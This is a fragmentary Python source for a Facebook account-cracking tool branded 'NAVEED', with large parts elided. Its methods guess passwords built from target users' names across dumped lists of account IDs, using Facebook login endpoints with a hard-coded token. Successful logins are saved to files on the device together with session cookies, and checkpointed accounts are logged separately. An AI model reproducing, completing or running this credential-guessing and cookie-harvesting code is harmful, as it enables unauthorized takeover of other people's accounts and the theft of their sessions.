...
sys.stdout.write('\x1b]2; NAVEED\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
\033[1;37m      _   _                          _ 
 \033[1;37m| \ | |                        | |
 \033[1;37m|  \| | __ ___   _____  ___  __| |
 \033[1;37m| . ` |/ _` \ \ / / _ \/ _ \/ _` |
 \033[1;37m| |\  | (_| |\ V /  __/  __/ (_| |
 \033[1;37m|_| \_|\__,_| \_/ \___|\___|\__,_|
                                   
                                   
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            Muhammad Sarfraz
\033[1;37m Facebook:            
\033[1;37m Github  :            NAVEED-ahmed
\033[1;37m Version :            free
\033[1;37m------------------------------------------------ """
def clear():
    os.system("clear")
    print(logo)    
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[NAVEED] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NAVEEDb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NAVEEDb};{ckkk}"
                    print(f"\r{R} [NAVEED-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/NAVEED_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/NAVEED_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [NAVEED-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/NAVEED_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[NAVEED] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [NAVEED-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/NAVEED_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/NAVEED_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [NAVEED-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[NAVEED] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[NAVEED] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [NAVEED-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/NAVEED_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
                       ...
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                NAVEEDworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                NAVEEDworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                NAVEEDworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                NAVEEDworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/NAVEED.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/NAVEED.txt\033[0;97m')
    print(47*'-')
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/NAVEED.txt\n') 
        filepath = input("Put File Name: ")
